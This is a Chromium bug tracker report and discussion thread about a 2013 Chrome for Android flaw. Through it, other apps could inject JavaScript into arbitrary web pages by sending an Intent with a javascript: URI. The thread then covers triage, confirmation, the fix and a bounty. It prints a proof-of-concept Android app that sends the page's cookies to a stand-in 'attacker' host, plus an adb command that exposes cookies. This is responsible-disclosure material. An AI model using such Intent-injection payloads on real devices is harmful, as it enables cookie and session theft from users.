# Security: JavaScript injection into arbitrary web pages via Intent with JavaScript URI

| Field | Value |
|-------|-------|
| **Issue ID** | [40076797](https://issues.chromium.org/issues/40076797) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals |
| **Platforms** | Android |
| **Reporter** | vi...@gmail.com |
| **Assignee** | ni...@chromium.org |
| **Created** | 2013-01-11 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

By sending an Intent with malicious JavaScript URI to Chrome for Android, other Android apps can inject JavaScript code into arbitrary Web pages rendered in Chrome. This leads to leakage of cookies, saved passwords and so on. The JavaScript shown below enables this.

(function () {  

window.location.href="<http://www.google.com/>";  

window.addEventListener("DOMContentLoaded", function() {  

// this callback is executed in [www.google.com](http://www.google.com)  

}, false);  

}());

**VERSION**  

Chrome Version: 18.0.1025469 stable  

Operating System: Android 4.2.1; Galaxy Nexus Build/JOP40D

**REPRODUCTION CASE**  

package com.example.javascriptintentexploit;

import android.app.Activity;  

import android.content.Intent;  

import android.net.Uri;  

import android.os.Bundle;  

import android.os.Handler;

public class MainActivity extends Activity {

```
@Override  
protected void onCreate(Bundle savedInstanceState) {  
	super.onCreate(savedInstanceState);  
	setContentView(R.layout.activity_main);  

	new Handler().postDelayed(new Runnable() {  
		@Override  
		public void run() {  
			// This JavaScript sends cookie for google to attacker's site.  
			String jsUrl = "javascript:(function(){"  
					+ "window.location.href='https://www.google.com/';"  
					+ "window.addEventListener('DOMContentLoaded', function(){"  
					+ "var e=encodeURIComponent;"  
					+ "window.location.href='http://attacker/?c='+e(document.cookie)+'&d='+e(document.domain);"  
					+ "}, false);}());";  
			Intent intent = new Intent("android.intent.action.VIEW");  
			intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");  
			intent.setData(Uri.parse(jsUrl));  
			startActivity(intent);  
		}  
	}, 3000);  
}  

```

}

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

**Type of crash: [tab, browser, etc.]**  

**Crash State: [see link above: stack trace, registers, exception record]**  

**Client ID (if relevant): [see link above]**

## Timeline

### sc...@gmail.com (2013-01-11)

Sounds interesting. Over to @palmer for triage?

### pa...@google.com (2013-01-11)

I'll take a look at this after the conference. CCing more people FYI.

### pa...@chromium.org (2013-01-18)

The exploit is not working for me. References to document.cookie generate this message in the log:

    I/chromium(26342): [INFO:CONSOLE(1)] "Uncaught Error: SECURITY_ERR: DOM Exception 18", source:  (1)

I changed the jsUrl to a simpler payload just to see if it would work:

    jsUrl = "javascript:alert(document.domain);";

and that works to cause Chrome to open a *new* tab and fire the alert, and since it's a new tab, document.domain is blank.

We had a bug like this before, and fixed it, and as far as I can see, it's still fixed.

virifi129: Please let me know if I am missing something, or if you can fix the exploit so that it works again. I'll re-open the bug if so. Thanks!

(WontFix because obsolete, already fixed.)

### vi...@gmail.com (2013-01-18)

The exploit is still working for me.

I tried this exploit following environments.
1.Chrome Version : Chrome for Android 18.0.1025469
   OS : Android 4.2.1; Nexus 4 Build/JOP40D
2.Chrome Version : Chrome Beta 25.0.1364.37
   OS : Android 4.2.1; Nexus 4 Build/JOP40D
These versions are latest in Google Play and I cannot build latest Chromium for Android because its full source code isn't public, so I can't try this exploit on the latest code.

jsUrl = "javascript:"
        + "window.location.href='https://code.google.com/';"
        + "window.addEventListener('DOMContentLoaded', function() {"
        + "alert('hello');"
	+ "}, false);";

This code is the simplest one to work for me.
It causes Chrome to open https://code.google.com/ in a new tab and alert 'hello' in the same page.
If I change 'hello' to document.domain, Chrome alerts 'code.google.com'.

palmer : Could you try above code? (Try alert('hello') not alert(document.domain)) If this code doesn't work, this bug would have been fixed.

### [Deleted User] (2013-01-18)

I tested this, it seems to work:
 adb shell am start -a android.intent.action.VIEW -n com.google.android.apps.chrome_dev/com.google.android.apps.chrome.Main -d "javascript:window.location.href='https://code.google.com/';window.addEventListener('DOMContentLoaded', function() {alert(document.cookie)}, false);"
Starting: Intent { act=android.intent.action.VIEW dat=javascript:window.location.href='https://code.google.com/';window.addEventListener('DOMContentLoaded', function() {alert(document.cookie)}, false); cmp=com.google.android.apps.chrome_dev/com.google.android.apps.chrome.Main }

I get the cookie in the alert.

### pa...@chromium.org (2013-01-18)

virifi129: Yes, you are right, I am sorry!

nileshagrawal: I think we are going to have to disallow javascript: URLs from Intents, as I suggested in https://code.google.com/p/chromium/issues/detail?id=144813 .

### pa...@chromium.org (2013-01-18)

virifi129: We will consider this bug for a reward under out Vulnerability Rewards Program (http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program).

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### [Deleted User] (2013-01-18)

phew :) Not a P0 - so move it forward to be picked up for M25. 

### ni...@chromium.org (2013-01-18)

[Empty comment from Monorail migration]

### [Deleted User] (2013-01-18)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-01-19)

Srikanth: For our security bug tracking metrics, we use MStone to mean "what version was affected". I agree that we don't need to backport the fix to 18, but here, SecImpacts-Stable means "18 stable".

### [Deleted User] (2013-01-19)

@palmer: to be pedantic about it, we use (in security team at least) Mstone in two different ways:

1) When bug is filed, set Mstone at the earliest affected currently shipping release -- i.e. M18 in this case as you have done.

2) When the bug is fixed and merged, adjust Mstone to reflect the version of Chrome with the fix.

### bu...@chromium.org (2013-01-22)

Project: .../internal/apps
Branch : master
Author : Nilesh Agrawal <nileshagrawal@chromium.org>
Commit : e20415b22bb46339e549f5632f0bb0a1c07515ba

Code Review +2: Nilesh Agrawal
Verified    +1: Nilesh Agrawal
Change-Id     : I3a701ee6dd4817505a4d8151f93e791cdaa97474
Reviewed-at   : https://gerrit-int.chromium.org/31397

### [Deleted User] (2013-01-27)

Need to bring this over into M25

### ke...@google.com (2013-01-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-29)

Project: .../internal/apps
Branch : 1364
Author : Nilesh Agrawal <nileshagrawal@chromium.org>
Commit : 5e1fe9a673e7cb41bb2bcf86b763e84036baa474

Code Review +2: Nilesh Agrawal
Verified    +1: Nilesh Agrawal
Change-Id     : I1faa615b8e6e691aa5aecccf6bd1509decf97489
Reviewed-at   : https://gerrit-int.chromium.org/31719

### ni...@chromium.org (2013-01-29)

[Empty comment from Monorail migration]

### [Deleted User] (2013-02-01)

Should be in build 25.0.1364.64+ (which is expected to go to public Beta)

### pa...@chromium.org (2013-02-02)

Congratulations! We have decided to reward you $500 for reporting this bug, virifi129. Please let us know how you'd like to be credited in the release notes.

### vi...@gmail.com (2013-02-02)

Please credit me as "Hironori Tokuta"

### [Deleted User] (2013-02-16)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-02-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-04-11)

Bulk edit for SecurityNotify.

### pa...@chromium.org (2013-04-15)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-06-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/169401?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076797)*
